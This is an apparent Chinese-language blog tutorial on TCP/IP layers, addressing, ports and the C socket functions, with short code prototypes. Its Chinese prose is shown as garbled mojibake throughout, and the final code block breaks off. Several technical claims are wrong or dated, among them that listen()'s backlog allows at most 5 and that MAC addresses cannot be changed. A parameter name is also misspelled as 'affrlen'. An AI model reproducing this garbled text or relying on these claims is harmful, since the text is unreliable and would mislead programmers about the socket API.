        <content type="html"><![CDATA[<h1 id="ç½‘ç»œæ¨¡å‹ä¸åè®®"><a href="#ç½‘ç»œæ¨¡å‹ä¸åè®®" class="headerlink" title="ç½‘ç»œæ¨¡å‹ä¸åè®®"></a>ç½‘ç»œæ¨¡å‹ä¸åè®®</h1><p>å¤§å¤šæ•°ç½‘ç»œæ¨¡å‹éƒ½æ˜¯æŒ‰å±‚çš„æ–¹å¼æ¥ç»„ç»‡çš„ã€‚åœ¨åˆ†å±‚ç½‘ç»œæ¨¡å‹ä¸­ï¼Œæ¯ä¸€å±‚éƒ½ä¸ºä¸Šä¸€å±‚æä¾›ä¸€å®šçš„æœåŠ¡ï¼Œè€ŒæŠŠå¦‚ä½•å®ç°æœ¬å±‚æœåŠ¡çš„ç»†èŠ‚å¯¹ä¸Šä¸€å±‚åŠ ä»¥å±è”½ï¼Œä¸Šå±‚åªéœ€çŸ¥é“ä¸‹å±‚æä¾›äº†ä»€ä¹ˆåŠŸèƒ½ä»¥åŠå¯¹åº”ä¸è¿™äº›åŠŸèƒ½çš„æ¥å£ã€‚</p><p>ä¸ºäº†ç¡®ä¿ä½¿ç”¨ä¸åŒç¡¬ä»¶å’Œåº•å±‚åè®®æ„å»ºçš„ç½‘ç»œèƒ½ç›¸äº’è¿›è¡Œé€šä¿¡ï¼Œå›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼ˆISOï¼‰åˆ¶å®šäº†ä¸€å¥—è¢«ç§°ä¸ºå¼€æ”¾ç³»ç»Ÿäº’è”ï¼ˆOSIï¼‰çš„è§„èŒƒã€‚ä½†ç”±äºç§ç§åŸå› ï¼Œ<code>OSI æ¨¡å‹</code>æ²¡æœ‰å¾—åˆ°å¹¿æ³›åº”ç”¨ï¼Œå½“å‰æ™®éä½¿ç”¨çš„æ˜¯ <code>TCP/IP æ¨¡å‹</code>ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wKiom1U94DeQlYq8AABs6_RQoBk468.jpg"></p><p>ï¼ˆ1ï¼‰ç½‘ç»œæ¥å£å±‚</p><p>TCP/IP æ¨¡å‹æœ€ä¸‹ä¸€å±‚ï¼ŒåŒ…å«å¤šç§é€»è¾‘é“¾è·¯æ§åˆ¶å’Œåª’ä½“è®¿é—®åè®®ï¼Œè´Ÿè´£å°†ç½‘ç»œå±‚å‘æ¥çš„æ•°æ®åˆ†å±‚å¸§ï¼Œå¹¶é€šè¿‡ç‰©ç†é“¾è·¯è¿›è¡Œä¼ é€ï¼Œæˆ–ä»ç½‘ç»œä¸Šæ¥æ”¶ç‰©ç†å¸§ï¼ŒæŠ½å–æ•°æ®å¹¶è½¬äº¤ç»™å…¶ä¸Šçš„ç½‘ç»œå±‚ã€‚</p><p>ï¼ˆ2ï¼‰ç½‘ç»œå±‚</p><p>è´Ÿè´£åœ¨å‘é€ç«¯å’Œæ¥å—ç«¯ä¹‹é—´å»ºç«‹ä¸€æ¡è™šæ‹Ÿè·¯å¾„ã€‚è¿™ä¸€å±‚çš„ä¸»è¦åè®®æ˜¯ <code>IPåè®®</code> ã€‚</p><blockquote><p>IP åè®®ï¼ˆInternet Protocalï¼‰ä¸»è¦è´Ÿè´£ç¡®å®šè·¯ç”±ï¼Œé€‰æ‹©ä¸€æ¡æœ€çŸ­è·¯ç”±æ¥å°†æ•°æ®åˆ†ç»„ä¼ é€åˆ°ç›®çš„è®¡ç®—æœºã€‚</p></blockquote><p>è¿™ä¸€å±‚çš„ <code>ARPåè®®</code> ï¼ˆåœ°å€è§£æåè®®ï¼‰å’Œ <code>RARPåè®®</code> ï¼ˆåå‘åœ°å€è§£æåè®®ï¼‰ç”¨äº IPåœ°å€å’Œç‰©ç†åœ°å€çš„ç›¸äº’è½¬æ¢ã€‚å¦‚æœæ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œè¯¥å±‚çš„ <code>ICMPåè®®</code> å°†äº§ç”Ÿé”™è¯¯æŠ¥æ–‡ã€‚</p><p>ï¼ˆ3ï¼‰ä¼ è¾“å±‚</p><p>é€šè¿‡ä½äºè¯¥å±‚çš„ <code>TCPåè®®</code> ï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰æˆ– <code>UDPåè®®</code> ï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰åœ¨ä¸¤å°ä¸»æœºé—´ä¼ è¾“æ•°æ®ï¼Œæä¾›åº”ç”¨ç¨‹åºé—´çš„é€šä¿¡ã€‚è¯¥å±‚ä¸»è¦åŠŸèƒ½æœ‰å·®é”™æ§åˆ¶ï¼Œä¼ è¾“ç¡®è®¤å’Œä¸¢å¤±é‡ä¼ ç­‰ã€‚</p><blockquote><p>TCP åè®®æä¾›å¯é çš„é¢å‘è¿æ¥çš„æœåŠ¡ï¼Œä¿è¯æ•°æ®èƒ½å®Œæ•´åœ°æŒ‰é¡ºåºåœ°ä¼ é€åˆ°ç›®æ ‡è®¡ç®—æœºã€‚å®ƒåœ¨ä¼ è¾“æ•°æ®å‰éœ€è¦å’Œç›®æ ‡è®¡ç®—æœºå»ºç«‹è¿æ¥ï¼Œå¹¶åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ç»´æŒæ­¤è¿æ¥ï¼Œå› æ­¤åœ¨é€Ÿåº¦ä¸Šä¼šæœ‰äº›æŸå¤±ã€‚</p></blockquote><p>ä½¿ç”¨TCPè¿›è¡Œé€šä¿¡çš„è¿‡ç¨‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1215110-20180201220928796-1989421651.png"></p><blockquote><p>UDPåè®®æä¾›ç®€å•çš„æ— è¿æ¥æœåŠ¡ï¼Œå®ƒä¸ä¿è¯æ•°æ®èƒ½æŒ‰é¡ºåºã€æ­£ç¡®åœ°ä¼ é€åˆ°ç›®æ ‡è®¡ç®—æœºï¼Œå®ƒä¸ç”¨å»ºç«‹è¿æ¥ï¼Œé€šå¸¸é€Ÿåº¦ä¸Šè¦æ¯”TCP å¿«äº›ã€‚</p></blockquote><p>ï¼ˆ4ï¼‰åº”ç”¨å±‚</p><p>åº”ç”¨å±‚é¢å‘ç”¨æˆ·æä¾›ä¸€ç³»åˆ—è®¿é—®ç½‘ç»œçš„åè®®ï¼Œå¦‚ç”¨äºä¼ è¾“æ–‡ä»¶çš„ <code>FTPåè®®</code> ã€ç”¨äºè¿œç¨‹ç™»é™†çš„ <code>Telnetåè®®</code> ã€ç”¨äºå‘é€ç”µå­é‚®ä»¶çš„ <code>SMTPåè®®</code> ï¼Œä»¥åŠæœ€å¸¸ç”¨çš„ç”¨äºæµè§ˆç½‘é¡µçš„ <code>HTTPåè®®</code>ã€‚</p><p>ä¸Šé¢æåˆ°çš„åè®®ç®€å•è®²å°±æ˜¯é€šä¿¡å®ä½“ä¸ºå®ç°æ­£ç¡®çš„é€šä¿¡è€Œåˆ¶å®šçš„è§„åˆ™ã€‚å°±åƒäººç±»äº¤æµéœ€è¦ä¸€ç§åŒæ–¹éƒ½èƒ½ç†è§£çš„è¯­è¨€ï¼Œä¸¤å°è®¡ç®—æœºé—´è¦è¿›è¡Œé€šä¿¡ä¹Ÿéœ€è¦è¿™æ ·çš„è¯­è¨€ï¼Œå³åè®®ã€‚</p><h1 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h1><p>ä¸ºä½¿ç½‘ç»œä¸Šçš„è®¡ç®—æœºèƒ½äº’ç›¸é€šä¿¡ï¼Œå¿…é¡»æœ‰å”¯ä¸€çš„æ ‡è¯†æ¥åŒºåˆ†ç½‘ç»œä¸Šçš„æ¯ä¸€å°è®¡ç®—æœºã€‚æœ‰ä¸¤ç§æ ‡è¯†å¯ä»¥ä½¿ç”¨ï¼šç‰©ç†åœ°å€ï¼ˆå¦‚ç½‘å¡åœ°å€ï¼‰å’Œ IPåœ°å€ã€‚åœ¨shellä¸‹è¾“å…¥å‘½ä»¤ <code>ifconfig</code> å¯ä»¥æŸ¥çœ‹åˆ°æœ¬æœºçš„åœ°å€ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210225113612065.png" alt="image-20210225113612065"></p><p><strong>ç‰©ç†åœ°å€</strong></p><p>ä¸Šé¢çš„ 00:0c:29:79:ad:5d å°±æ˜¯ä»¥16è¿›åˆ¶è¡¨ç¤ºçš„48ä½ï¼ˆ6å­—èŠ‚ï¼‰ç½‘å¡åœ°å€ï¼Œæ­¤åœ°å€åœ¨ç½‘å¡çš„ç”Ÿæˆè¿‡ç¨‹ä¸­å°±å·²ç»å›ºå®šï¼Œä¸å¯æ›´æ”¹ï¼Œä¸”å…¨çƒå”¯ä¸€ã€‚</p><p><strong>IPåœ°å€</strong></p><p>IPåœ°å€æ˜¯ä¸åº•å±‚ç¡¬ä»¶æŠ€æœ¯æ— å…³çš„é€šç”¨åœ°å€ï¼Œå¦‚ä¸Šçš„ 192.168.232.128 ã€‚32ä½ï¼ˆ4å­—èŠ‚ï¼‰çš„IPåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šè®¡ç®—æœºæ‰€åœ¨çš„ç½‘ç»œå·å’Œè¯¥ç½‘ç»œç»™è¯¥è®¡ç®—æœºåˆ†é…çš„ä¸»æœºå·ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/unnamed.jpg"></p><p>TCP/IPä¸Šçš„æ¯å°ä¸»æœºè¿˜æœ‰ä¸€ä¸ª32ä½çš„å­ç½‘æ©ç ï¼Œå¦‚ä¸Šçš„ 255.255.255.0 ã€‚å®ƒç”¨æ¥åŒºåˆ†IPåœ°å€çš„ç½‘ç»œå·å’Œä¸»æœºå·ã€‚å°†IPåœ°å€ä¸å­ç½‘æ©ç è¿›è¡ŒæŒ‰ä½â€œä¸â€è¿ç®—å°±å¯å¾—åˆ°IPåœ°å€çš„ç½‘ç»œå·ã€‚ä¾‹å¦‚ï¼Œå°†ä¸Šé¢çš„IPåœ°å€ä¸å­ç½‘æ©ç â€œä¸â€œè¿ç®—å¾—åˆ°çš„ç»“æœä¸º 192.168.232.0 ï¼Œå³å¯¹åº”çš„ç½‘ç»œå·ã€‚</p><p>IPv6 ä¸ºIPåœ°å€çš„æœ€æ–°ç‰ˆæœ¬ï¼Œç”¨äºè§£å†³IPv4åœ°å€æ¯ç«­é—®é¢˜ã€‚IPv6äºŒè¿›ä½åˆ¶ä¸‹ä¸º128ä½é•¿åº¦ï¼Œä»¥16ä½ä¸ºä¸€ç»„ï¼Œæ¯ç»„ä»¥å†’å·â€œ:â€éš”å¼€ï¼Œå¯ä»¥åˆ†ä¸º8ç»„ï¼Œæ¯ç»„ä»¥4ä½åå…­è¿›åˆ¶æ–¹å¼è¡¨ç¤ºã€‚å¦‚ä¸Šé¢çš„ fe80::63f4:6f8e:f307:3776 ã€‚</p><h1 id="ç«¯å£"><a href="#ç«¯å£" class="headerlink" title="ç«¯å£"></a>ç«¯å£</h1><p>å¯¹äºä¸€å°è®¡ç®—æœºä¸Šçš„å¤šä¸ªåº”ç”¨ç¨‹åºï¼ŒTCPå’ŒUDPåè®®é‡‡ç”¨16ä½çš„ç«¯å£å·æ¥è¯†åˆ«å®ƒä»¬ã€‚ä¸€å°è®¡ç®—æœºä¸Šçš„ä¸åŒè¿›ç¨‹å¯ä»¥ç»‘å®šåˆ°ä¸åŒçš„ç«¯å£ä¸Šï¼Œè¿™äº›è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®ç½‘ç»œè€Œäº’ä¸å¹²æ‰°ã€‚å¦‚FTPåè®®ä¸“ç”¨ç«¯å£21ï¼Œ HTTPåè®®å¸¸ç”¨ç«¯å£80ï¼ŒmysqlæœåŠ¡å¸¸ç”¨ç«¯å£3306ã€‚</p><h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><p>æˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªè¿›ç¨‹å¦‚æœéœ€è¦è¿›è¡Œé€šè®¯æœ€åŸºæœ¬çš„ä¸€ä¸ªå‰æèƒ½èƒ½å¤Ÿå”¯ä¸€çš„æ ‡ç¤ºä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨æœ¬åœ°è¿›ç¨‹é€šè®¯ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PIDæ¥å”¯ä¸€æ ‡ç¤ºä¸€ä¸ªè¿›ç¨‹ï¼Œä½†PIDåªåœ¨æœ¬åœ°å”¯ä¸€ï¼Œç½‘ç»œä¸­çš„ä¸¤ä¸ªè¿›ç¨‹PIDå†²çªå‡ ç‡å¾ˆå¤§ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å¦è¾Ÿå®ƒå¾„äº†ï¼Œæˆ‘ä»¬çŸ¥é“IPå±‚çš„ipåœ°å€å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºï¼Œè€ŒTCPå±‚åè®®å’Œç«¯å£å·å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ipåœ°å€ï¼‹åè®®ï¼‹ç«¯å£å·å”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„ä¸€ä¸ªè¿›ç¨‹ã€‚</p><p>èƒ½å¤Ÿå”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„è¿›ç¨‹åï¼Œå®ƒä»¬å°±å¯ä»¥åˆ©ç”¨socketè¿›è¡Œé€šä¿¡äº†ï¼Œä»€ä¹ˆæ˜¯socketå‘¢ï¼Ÿæˆ‘ä»¬ç»å¸¸æŠŠsocketç¿»è¯‘ä¸ºå¥—æ¥å­—ï¼Œsocketæ˜¯åœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œå®ƒæŠŠTCP/IPå±‚å¤æ‚çš„æ“ä½œæŠ½è±¡ä¸ºå‡ ä¸ªç®€å•çš„æ¥å£ä¾›åº”ç”¨å±‚è°ƒç”¨ä»¥å®ç°è¿›ç¨‹åœ¨ç½‘ç»œä¸­é€šä¿¡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/05225723-2ffa89aad91f46099afa530ef8660b20.jpg"></p><p>socketèµ·æºäºUNIXï¼Œåœ¨Unixä¸€åˆ‡çš†æ–‡ä»¶å“²å­¦çš„æ€æƒ³ä¸‹ï¼Œsocketæ˜¯ä¸€ç§â€æ‰“å¼€â€”è¯»/å†™â€”å…³é—­â€æ¨¡å¼çš„å®ç°ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å„è‡ªç»´æŠ¤ä¸€ä¸ªâ€æ–‡ä»¶â€ï¼Œåœ¨å»ºç«‹è¿æ¥æ‰“å¼€åï¼Œå¯ä»¥å‘è‡ªå·±æ–‡ä»¶å†™å…¥å†…å®¹ä¾›å¯¹æ–¹è¯»å–æˆ–è€…è¯»å–å¯¹æ–¹å†…å®¹ï¼Œé€šè®¯ç»“æŸæ—¶å…³é—­æ–‡ä»¶ã€‚</p><p>ä»¥ä½¿ç”¨TCPåè®®é€šè®¯çš„socketä¸ºä¾‹ï¼Œå…¶äº¤äº’æµç¨‹ä¸»è¦å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/05232335-fb19fc7527e944d4845ef40831da4ec2.png"></p><h1 id="å¥—æ¥å­—å‡½æ•°"><a href="#å¥—æ¥å­—å‡½æ•°" class="headerlink" title="å¥—æ¥å­—å‡½æ•°"></a>å¥—æ¥å­—å‡½æ•°</h1><h2 id="åˆ›å»ºå¥—æ¥å­—"><a href="#åˆ›å»ºå¥—æ¥å­—" class="headerlink" title="åˆ›å»ºå¥—æ¥å­—"></a>åˆ›å»ºå¥—æ¥å­—</h2><p>socket å‡½æ•°ç”¨æ¥åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼Œå‡½æ•°åŸå‹ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•° domain ç”¨äºæŒ‡å®šåˆ›å»ºå¥—æ¥å­—æ‰€ä½¿ç”¨çš„åè®®æ—ã€‚å¸¸ç”¨çš„åè®®æ—å¦‚ä¸‹ï¼š</p><ul><li>AF_UNIXï¼šåˆ›å»ºåªåœ¨æœ¬æœºå†…è¿›è¡Œé€šä¿¡çš„å¥—æ¥å­—ã€‚</li><li>AF_INETï¼šä½¿ç”¨ IPv4 TCP/IPåè®®ã€‚</li><li>AF_INET6ï¼šä½¿ç”¨IPv6 TCP/IPåè®®ã€‚</li></ul><p>å‚æ•° typeæŒ‡å®šå¥—æ¥å­—çš„ç±»å‹ï¼Œå¯å–å¦‚ä¸‹å€¼ï¼š</p><ul><li>SOCK_STREAMï¼šåˆ›å»ºTCPæµå¥—æ¥å­—ã€‚</li><li>SOCK_DGRAMï¼šåˆ›å»ºUDPæ•°æ®æŠ¥å¥—æ¥å­—ã€‚</li></ul><p>å‚æ•° protocol é€šå¸¸è®¾ç½®ä¸º0ã€‚</p><p>åˆ›å»ºæˆåŠŸè¿”å›ä¸€ä¸ªæ–°åˆ›å»ºçš„å¥—æ¥å­—ï¼Œè‹¥æœ‰é”™è¯¯å‘ç”Ÿåˆ™è¿”å›-1ã€‚</p><p>ä¸‹é¢çš„ä»£ç åˆ›å»ºäº†ä¸€ä¸ª TCP å¥—æ¥å­—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sock_fd;</span><br><span class="line">sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sock_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å»ºç«‹è¿æ¥"><a href="#å»ºç«‹è¿æ¥" class="headerlink" title="å»ºç«‹è¿æ¥"></a>å»ºç«‹è¿æ¥</h2><p>å‡½æ•° connect ç”¨æ¥åœ¨ä¸€ä¸ªæŒ‡å®šçš„å¥—æ¥å­—ä¸Šåˆ›å»ºä¸€ä¸ªè¿æ¥ã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•°sockfdæ˜¯æ¬²å»ºç«‹è¿æ¥çš„æœ¬åœ°å¥—æ¥å­—æè¿°ç¬¦ã€‚å‚æ•°addræŒ‡å‡ºè¯´æ˜å¯¹æ–¹å¥—æ¥å­—åœ°å€ç»“æ„çš„æŒ‡é’ˆã€‚å¯¹æ–¹å¥—æ¥å­—åœ°å€é•¿åº¦ç”±affrlenè¯´æ˜ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿï¼Œconnect()è¿”å›0ã€‚</p><h2 id="ç»‘å®šå¥—æ¥å­—"><a href="#ç»‘å®šå¥—æ¥å­—" class="headerlink" title="ç»‘å®šå¥—æ¥å­—"></a>ç»‘å®šå¥—æ¥å­—</h2><p>å‡½æ•° bind ç”¨æ¥å°†ä¸€ä¸ªå¥—æ¥å­—å’ŒæŸä¸ªç«¯å£ç»‘å®šåœ¨ä¸€èµ·ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸€èˆ¬åªæœ‰æœåŠ¡å™¨ç«¯çš„ç¨‹åºè°ƒç”¨ã€‚å‚æ•°sockfdæ˜¯ç”±socket()è°ƒç”¨è¿”å›çš„å¹¶ä¸”æœªä½œè¿æ¥çš„å¥—æ¥å­—æè¿°ç¬¦(å¥—æ¥å­—å·)ã€‚å‚æ•°addræ˜¯èµ‹ç»™å¥—æ¥å­—çš„æœ¬åœ°åœ°å€ï¼ˆåå­—ï¼‰ï¼Œå…¶é•¿åº¦å¯å˜ï¼Œç»“æ„éšé€šä¿¡åŸŸçš„ä¸åŒè€Œä¸åŒã€‚affrlenè¡¨æ˜äº†addrçš„é•¿åº¦ã€‚</p><h2 id="åœ¨å¥—æ¥å­—ä¸Šç›‘å¬"><a href="#åœ¨å¥—æ¥å­—ä¸Šç›‘å¬" class="headerlink" title="åœ¨å¥—æ¥å­—ä¸Šç›‘å¬"></a>åœ¨å¥—æ¥å­—ä¸Šç›‘å¬</h2><p>å‡½æ•° listen æŠŠå¥—æ¥å­—è½¬åŒ–ä¸ºè¢«åŠ¨ç›‘å¬ï¼Œç­‰å¾…æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> s,<span class="keyword">int</span> backlog)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•°sæ ‡è¯†ä¸€ä¸ªæœ¬åœ°å·²å»ºç«‹ã€å°šæœªè¿æ¥çš„å¥—æ¥å­—å·ï¼ŒæœåŠ¡å™¨æ„¿æ„ä»å®ƒä¸Šé¢æ¥æ”¶è¯·æ±‚ã€‚backlogè¡¨ç¤ºè¯·æ±‚è¿æ¥é˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦ï¼Œç”¨äºé™åˆ¶æ’é˜Ÿè¯·æ±‚çš„ä¸ªæ•°ï¼Œç›®å‰å…è®¸çš„æœ€å¤§å€¼ä¸º5ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿï¼Œlisten()è¿”å›0ã€‚</p><h2 id="æ¥å—è¿æ¥"><a href="#æ¥å—è¿æ¥" class="headerlink" title="æ¥å—è¿æ¥"></a>æ¥å—è¿æ¥</h2><p>å‡½æ•° accept ç”¨æ¥æ¥å—ä¸€ä¸ªè¿æ¥è¯·æ±‚ã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°sockfd æ˜¯ç”±å‡½æ•°socketåˆ›å»ºï¼Œç»å‡½æ•°bind ç»‘å®šåˆ°æœ¬åœ°çš„æŸä¸€ç«¯å£ä¸Šï¼Œç„¶åé€šè¿‡å‡½æ•°listenè½¬åŒ–è€Œæ¥çš„ç›‘å¬å¥—æ¥å­—ã€‚</li><li>å‚æ•° addr ç”¨æ¥ä¿å­˜å‘èµ·è¿æ¥è¯·æ±‚çš„ä¸»æœºçš„åœ°å€å’Œç«¯å£ã€‚</li><li>å‚æ•° addrlen æ˜¯ addr æ‰€æŒ‡å‘çš„ç»“æ„ä½“çš„å¤§å°ã€‚</li></ul><p>æ‰§è¡ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ–°çš„ä»£è¡¨å®¢æˆ·ç«¯çš„å¥—æ¥å­—ï¼Œå‡ºé”™è¿”å›-1ã€‚</p><h2 id="å‘é€æ•°æ®"><a href="#å‘é€æ•°æ®" class="headerlink" title="å‘é€æ•°æ®"></a>å‘é€æ•°æ®</h2><p>å‡½æ•°sendç”¨æ¥åœ¨TCPå¥—æ¥å­—ä¸Šå‘é€æ•°æ®ã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•°sockfdä¸ºå·²è¿æ¥çš„æœ¬åœ°å¥—æ¥å­—æè¿°ç¬¦ã€‚buf æŒ‡å‘å­˜æœ‰å‘é€æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œå…¶é•¿åº¦ç”±len æŒ‡å®šã€‚flags æŒ‡å®šä¼ è¾“æ§åˆ¶æ–¹å¼ï¼Œå¦‚æ˜¯å¦å‘é€å¸¦å¤–æ•°æ®ç­‰ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿï¼Œsend()è¿”å›æ€»å…±å‘é€çš„å­—èŠ‚æ•°ã€‚</p><h2 id="æ¥æ”¶æ•°æ®"><a href="#æ¥æ”¶æ•°æ®" class="headerlink" title="æ¥æ”¶æ•°æ®"></a>æ¥æ”¶æ•°æ®</h2><p>å‡½æ•°recvç”¨æ¥åœ¨TCPå¥—æ¥å­—ä¸Šæ¥æ”¶æ•°æ®ã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•°sockfdä¸ºå·²è¿æ¥çš„å¥—æ¥å­—æè¿°ç¬¦ã€‚bufæŒ‡å‘æ¥æ”¶è¾“å…¥æ•°æ®ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œå…¶é•¿åº¦ç”±len æŒ‡å®šã€‚flags æŒ‡å®šä¼ è¾“æ§åˆ¶æ–¹å¼ï¼Œå¦‚æ˜¯å¦æ¥æ”¶å¸¦å¤–æ•°æ®ç­‰ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿï¼Œrecv()è¿”å›æ€»å…±æ¥æ”¶çš„å­—èŠ‚æ•°ã€‚å¦‚æœè¿æ¥è¢«å…³é—­ï¼Œè¿”å›0ã€‚</p><h2 id="å…³é—­å¥—æ¥å­—"><a href="#å…³é—­å¥—æ¥å­—" class="headerlink" title="å…³é—­å¥—æ¥å­—"></a>å…³é—­å¥—æ¥å­—</h2><p>å‡½æ•°closeç”¨æ¥å…³é—­ä¸€ä¸ªå¥—æ¥å­—æè¿°ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 